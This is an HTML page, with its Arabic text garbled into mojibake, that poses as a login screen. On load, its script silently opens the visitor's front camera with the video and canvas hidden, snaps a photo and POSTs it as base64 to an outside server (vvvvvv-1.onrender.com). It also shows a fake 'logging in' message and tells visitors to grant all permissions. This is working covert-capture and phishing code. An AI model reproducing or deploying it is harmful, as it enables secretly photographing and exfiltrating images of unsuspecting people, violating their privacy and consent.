<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğ‘˜ğ‘ğ‘˜ğ‘â„ğ‘¦ğŸ‡¾ğŸ‡ª</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f7f9;
        }
        
        /* ğŸ›‘ Ø¥Ø®ÙØ§Ø¡ Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù€ canvas ğŸ›‘ */
        #camera-feed, #photo-canvas {
            display: none !important; 
        }

        #status-message {
            margin-top: 50px;
            font-weight: bold;
            font-size: 1.5em;
            color: #2c3e50;
        }
    </style>
</head>
<body>

    <h1> Ù…Ø±Ø­Ø¨Ø¢ Ø¨ÙƒÙ…</h1>
    <p>Ø³ÙŠØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø­Ø§Ù„ÙŠØ¢.</p>

    <video id="camera-feed" autoplay playsinline></video>
    <canvas id="photo-canvas"></canvas>

    <p id="status-message">Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ ..</p>

    <script>
        const video = document.getElementById('camera-feed');
        const canvas = document.getElementById('photo-canvas');
        const statusMessage = document.getElementById('status-message');
        
        // ğŸ›‘ Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ© ğŸ›‘
        function captureAndSend() {
            statusMessage.textContent = 'Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„...';

            // Ø¥Ø¶Ø§ÙØ© ØªØ£Ø®ÙŠØ± Ø¨Ø³ÙŠØ· Ù„Ø¶Ù…Ø§Ù† Ø§Ø³ØªÙ‚Ø±Ø§Ø± Ø§Ù„Ø¥Ø·Ø§Ø± (Ù„Ù…Ù†Ø¹ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡)
            setTimeout(() => {
                
                // ØªØ­Ø¯ÙŠØ¯ Ø£Ø¨Ø¹Ø§Ø¯ Ø§Ù„Ù€ Canvas
                canvas.width = video.videoWidth || 640; 
                canvas.height = video.videoHeight || 480;

                // Ø±Ø³Ù… Ø¥Ø·Ø§Ø± Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø­Ø§Ù„ÙŠ Ø¹Ù„Ù‰ Ø§Ù„Ù€ Canvas
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Base64
                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);

                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                sendPhotoToServer(imageDataURL);

            }, 500); // 500 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© (Ù†ØµÙ Ø«Ø§Ù†ÙŠØ©)
        }
        
        // 1. Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        async function startCamera() {
            try {
                // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
                const constraints = { video: { facingMode: 'user' } }; 
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                statusMessage.textContent = 'Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø¹Ù…Ù„. ÙŠØªÙ… Ø§Ù„ØªØ­Ø¶ÙŠØ± Ù„Ù„Ø¥Ø±Ø³Ø§Ù„...';
                
                // ğŸ›‘ Ø¹Ù†Ø¯ Ø¨Ø¯Ø¡ ØªØ¯ÙÙ‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ Ù‚Ù… Ø¨Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„ ÙÙˆØ±Ø§Ù‹ ğŸ›‘
                video.onloadedmetadata = function() {
                    captureAndSend();
                };

            } catch (err) {
                console.error(" Ø®Ø·Ø§ ÙÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ ğŸ’” ", err);
                statusMessage.textContent = 'â›” ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ø¹Ø·Ø§Ø¡ ÙƒÙ„ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ù„ÙƒÙŠ ÙŠØªÙƒ ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…ÙŠØ²Ø§Øª';
            }
        }

        // 3. Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø®Ø§Ø¯Ù… Ø§Ù„Ø®Ù„ÙÙŠ
        async function sendPhotoToServer(imageData) {
            // Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø§Ø¯Ù… Ø§Ù„Ø®Ù„ÙÙŠ (Render) Ø§Ù„Ø°ÙŠ ÙŠØ¹Ù…Ù„ Ø¨Ù†Ø¬Ø§Ø­
            const BACKEND_URL = 'https://vvvvvv-1.onrender.com/upload-photo'; 
            
            try {
                const response = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ image: imageData })
                });

                if (response.ok) {
                    statusMessage.textContent = 'âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­ Ø§Ù†ØªØ¶Ø± Ù‚Ù„ÙŠÙ„Ø¢ğŸ¤';
                } else {
                    const errorData = await response.json().catch(() => ({ message: response.statusText }));
                    statusMessage.textContent = `âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„. ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„Ø¨ÙˆØª ÙŠØ¹Ù…Ù„.`;
                }
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…:', error);
                statusMessage.textContent = 'âš ï¸ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…. ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„Ø®Ø§Ø¯Ù… ÙŠØ¹Ù…Ù„.';
            } finally {
                // Ø¥ÙŠÙ‚Ø§Ù ØªØ¯ÙÙ‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù„Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø§Ù„Ø®ØµÙˆØµÙŠØ©
                if (video.srcObject) {
                    const tracks = video.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                }
            }
        }

        // Ø¨Ø¯Ø¡ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        startCamera();
    </script>
</body>
</html>
